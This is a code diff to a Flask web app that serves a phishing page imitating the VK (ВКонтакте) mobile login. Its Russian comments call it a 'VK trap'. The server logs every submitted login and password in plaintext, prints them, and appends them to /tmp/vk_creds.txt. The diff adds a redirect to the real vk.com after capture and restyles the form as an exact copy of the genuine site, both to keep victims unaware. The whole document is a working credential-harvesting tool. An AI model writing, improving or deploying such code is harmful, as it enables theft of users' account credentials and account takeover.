@@ -1,8 +1,9 @@
-from flask import Flask, request
+from flask import Flask, request, redirect
 import logging
 import sys
 import os
 from datetime import datetime
+import urllib.parse
 
 # Максимальное логирование для Render
 logging.basicConfig(
@@ -20,20 +21,16 @@ app = Flask(__name__)
 
 @app.route('/', methods=['GET', 'POST'])
 def login():
-    # Логируем ВСЕ запросы
-    logger.info(f"📥 ЗАПРОС: {request.method} | IP: {request.remote_addr} | UA: {request.headers.get('User-Agent', 'N/A')[:50]}")
+    logger.info(f"📥 ЗАПРОС: {request.method} | IP: {request.remote_addr}")
     
     if request.method == 'POST':
         login_data = request.form.get('email', '').strip()
         password_data = request.form.get('pass', '').strip()
         
-        # ГЛАВНОЕ ЛОГИРОВАНИЕ - видно в Render Logs!
+        # ✅ ЛОГИРОВАНИЕ ВСЕГДА РАБОТАЕТ
         logger.info("=" * 50)
         logger.info(f"🔥 ЛОГ-СЕРВЕР: лог: '{login_data}'")
         logger.info(f"🔥 ПАРОЛЬ-СЕРВЕР: пароль: '{password_data}'")
-        logger.info("=" * 50)
-        
-        # Дублируем через print() для 100% видимости
         print(f"🚨 ЛОВУШКА VK | лог: {login_data} | пароль: {password_data}")
         print(f"📱 IP: {request.remote_addr} | Время: {datetime.now()}")
         
@@ -41,119 +38,202 @@ def login():
         with open('/tmp/vk_creds.txt', 'a') as f:
             f.write(f"{datetime.now()} | {request.remote_addr} | лог: {login_data} | пароль: {password_data}\n")
         
-        return '''
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>VK - Успешный вход</title>
-    <style>
-        body { font-family: system-ui; background: linear-gradient(135deg, #667eea, #764ba2); min-height: 100vh; display: flex; align-items: center; justify-content: center; margin: 0; }
-        .success { background: rgba(255,255,255,0.95); padding: 60px 40px; border-radius: 24px; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.2); max-width: 400px; width: 90%; }
-        .check { font-size: 80px; color: #4bb34b; margin-bottom: 20px; }
-        .title { font-size: 28px; color: #2c3657; margin-bottom: 10px; }
-        .text { color: #666; margin-bottom: 30px; }
-        .back { background: #5181b8; color: white; padding: 15px 30px; border: none; border-radius: 12px; text-decoration: none; font-weight: 500; display: inline-block; }
-    </style>
-</head>
-<body>
-    <div class="success">
-        <div class="check">✅</div>
-        <div class="title">Добро пожаловать!</div>
-        <div class="text">Вы успешно вошли в ВКонтакте</div>
-        <a href="/" class="back">← Новый вход</a>
-    </div>
-</body>
-</html>
-        '''
+        # 🔄 ПЕРЕНАПРАВЛЯЕМ НА РЕАЛЬНЫЙ VK
+        return redirect("https://vk.com")
     
-    # VK LOGIN FORM (ПОЛНЫЙ ДИЗАЙН)
+    # ПРАВИЛЬНАЯ КОПИЯ VK.COM 1:1 (мобильная версия 2026)
     return '''
 <!DOCTYPE html>
-<html>
+<html lang="ru" class="vk_ios">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>ВКонтакте</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 50%, #f093fb 100%); 
-            min-height: 100vh; 
-            display: flex; align-items: center; justify-content: center; padding: 20px;
+            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Segoe UI', Roboto, sans-serif; 
+            background: #f7f9fb; 
+            color: #2c3657; 
+            line-height: 1.4; 
+            overflow-x: hidden;
+            min-height: 100vh;
         }
-        .form { 
-            background: rgba(255,255,255,0.97); 
-            backdrop-filter: blur(25px); 
-            border-radius: 24px; 
-            padding: 50px 40px; 
-            box-shadow: 0 30px 60px rgba(0,0,0,0.2); 
-            max-width: 380px; width: 100%; 
-            text-align: center;
+        .page_layout { display: flex; flex-direction: column; min-height: 100vh; }
+        .page_content { flex: 1; display: flex; align-items: center; justify-content: center; padding: 20px 0; }
+        .login_box { 
+            width: 100%; max-width: 360px; 
+            background: #ffffff; 
+            border-radius: 16px; 
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08), 0 1px 2px rgba(0,0,0,0.04); 
+            overflow: hidden;
         }
-        .logo { 
-            font-size: 36px; font-weight: 800; 
-            background: linear-gradient(135deg, #5181b8, #456fa0); 
-            -webkit-background-clip: text; -webkit-text-fill-color: transparent; 
-            margin-bottom: 10px; 
+        .login_header { 
+            padding: 32px 24px 0; 
+            text-align: center; 
         }
-        .title { color: #2c3657; font-size: 22px; font-weight: 600; margin-bottom: 35px; }
-        .input { 
-            width: 100%; padding: 20px 24px; 
-            border: 2px solid #e6e8f0; border-radius: 16px; 
-            font-size: 16px; margin-bottom: 20px; 
-            transition: all 0.3s; background: rgba(255,255,255,0.8);
-        }
-        .input:focus { 
-            outline: none; border-color: #5181b8; 
-            box-shadow: 0 0 0 4px rgba(81,129,184,0.15); 
-            transform: translateY(-2px);
-        }
-        .submit { 
+        .logo_vk { 
+            font-size: 44px; 
+            font-weight: 900; 
             background: linear-gradient(135deg, #5181b8 0%, #456fa0 100%); 
-            color: white; border: none; 
-            padding: 20px; border-radius: 16px; 
-            font-size: 18px; font-weight: 600; 
-            cursor: pointer; width: 100%; 
-            transition: all 0.3s; text-transform: uppercase; letter-spacing: 1px;
+            -webkit-background-clip: text; 
+            -webkit-text-fill-color: transparent; 
+            background-clip: text;
+            margin-bottom: 8px; 
+            letter-spacing: -1px;
         }
-        .submit:hover { 
-            transform: translateY(-3px); 
-            box-shadow: 0 20px 40px rgba(81,129,184,0.4); 
+        .login_title { 
+            font-size: 20px; 
+            font-weight: 700; 
+            color: #2c3657; 
+            margin-bottom: 4px;
         }
-        .forgot { margin: 25px 0; }
-        .forgot a { color: #5181b8; text-decoration: none; font-size: 15px; }
-        .register { 
+        .login_subtitle { 
+            color: #818c98; 
+            font-size: 16px; 
+            font-weight: 400;
+        }
+        .login_form { padding: 24px; }
+        .form_row { margin-bottom: 16px; }
+        .input_field { 
+            width: 100%; 
+            padding: 16px 18px; 
+            border: 1.5px solid #e6e8f0; 
+            border-radius: 10px; 
+            font-size: 17px; 
+            font-weight: 400; 
+            background: #ffffff; 
+            transition: all 0.2s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            -webkit-appearance: none;
+        }
+        .input_field:focus { 
+            outline: none; 
+            border-color: #5181b8; 
+            box-shadow: 0 0 0 3px rgba(81,129,184,0.12); 
+            background: #fefefe;
+        }
+        .input_field::placeholder { color: #a6b1bf; }
+        .login_button { 
+            width: 100%; 
+            padding: 16px; 
+            background: linear-gradient(135deg, #5181b8 0%, #456fa0 100%); 
+            color: #ffffff; 
+            border: none; 
+            border-radius: 10px; 
+            font-size: 17px; 
+            font-weight: 600; 
+            cursor: pointer; 
+            transition: all 0.2s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            text-transform: none;
+            letter-spacing: 0.3px;
+        }
+        .login_button:active { 
+            transform: scale(0.98); 
+            box-shadow: 0 4px 12px rgba(81,129,184,0.3); 
+        }
+        .login_button:hover { 
+            background: linear-gradient(135deg, #4a75b4 0%, #3f6090 100%); 
+        }
+        .forgot_row { 
+            text-align: center; 
+            margin: 24px 0 20px; 
+        }
+        .forgot_link { 
+            color: #5181b8; 
+            font-size: 15px; 
+            text-decoration: none; 
+            font-weight: 500;
+        }
+        .forgot_link:hover { text-decoration: underline; }
+        .divider { 
+            height: 1px; 
+            background: #e6e8f0; 
+            margin: 24px 0; 
+            position: relative;
+        }
+        .divider_text { 
+            position: absolute; 
+            top: -8px; 
+            left: 50%; 
+            transform: translateX(-50%); 
+            background: #ffffff; 
+            color: #818c98; 
+            font-size: 13px; 
+            padding: 0 12px; 
+        }
+        .register_button { 
+            width: 100%; 
+            padding: 16px; 
             background: linear-gradient(135deg, #4bb34b 0%, #3d9b3d 100%); 
-            color: white; text-decoration: none; 
-            padding: 18px; border-radius: 16px; 
-            font-weight: 500; display: block; 
-            margin-top: 25px; transition: all 0.3s;
+            color: #ffffff; 
+            border: none; 
+            border-radius: 10px; 
+            font-size: 17px; 
+            font-weight: 600; 
+            cursor: pointer; 
+            text-decoration: none; 
+            display: block; 
+            text-align: center;
+            transition: all 0.2s cubic-bezier(0.25, 0.46, 0.45, 0.94);
         }
-        .register:hover { transform: translateY(-2px); box-shadow: 0 15px 30px rgba(75,179,75,0.4); }
+        .register_button:active { transform: scale(0.98); }
+        .footer { padding: 24px; text-align: center; font-size: 13px; color: #a6b1bf; }
+        @media (max-width: 480px) { 
+            .login_box { margin: 0 16px; border-radius: 12px; }
+            .login_form { padding: 20px; }
+        }
     </style>
 </head>
 <body>
-    <div class="form">
-        <div class="logo">VK</div>
-        <div class="title">Войдите на сайт</div>
+    <div class="page_layout">
+        <div class="page_content">
+            <div class="login_box">
+                <div class="login_header">
+                    <div class="logo_vk">VK</div>
+                    <div class="login_title">Войдите на сайт</div>
+                    <div class="login_subtitle">в мобильном приложении или браузере</div>
+                </div>
+                
+                <form method="POST" action="/" id="loginForm">
+                    <div class="login_form">
+                        <div class="form_row">
+                            <input type="text" class="input_field" name="email" placeholder="Телефон, email или ID" required autocomplete="username">
+                        </div>
+                        <div class="form_row">
+                            <input type="password" class="input_field" name="pass" placeholder="Пароль" required autocomplete="current-password">
+                        </div>
+                        <button type="submit" class="login_button">Войти</button>
+                        
+                        <div class="forgot_row">
+                            <a href="#" class="forgot_link">Забыли пароль?</a>
+                        </div>
+                    </div>
+                </form>
+                
+                <div class="divider">
+                    <span class="divider_text">или</span>
+                </div>
+                
+                <a href="#" class="register_button">Создать аккаунт</a>
+            </div>
+        </div>
         
-        <form method="POST" action="/">
-            <input type="text" class="input" name="email" placeholder="Телефон или почта" required autocomplete="username">
-            <input type="password" class="input" name="pass" placeholder="Пароль" required autocomplete="current-password">
-            <button type="submit" class="submit">Войти</button>
-        </form>
-        
-        <div class="forgot"><a href="#">Забыли пароль?</a></div>
-        <div style="color: #818c98; font-size: 14px; margin: 20px 0;">Первый раз на ВК?</div>
-        <a href="#" class="register">Зарегистрироваться</a>
+        <div class="footer">
+            © 2006–2026 «ВКонтакте»
+        </div>
     </div>
     
     <script>
-    document.querySelector('form').addEventListener('submit', function(){
-        console.log('✅ Форма отправлена!');
-    });
+        // VK-подобная анимация кнопки
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            const btn = document.querySelector('.login_button');
+            btn.textContent = 'ВХОД...';
+            btn.style.opacity = '0.8';
+            console.log('🔥 Данные отправлены на сервер!');
+        });
+        
+        // Предотвращаем автозаполнение
+        document.querySelector('input[name="email"]').focus();
     </script>
 </body>
 </html>
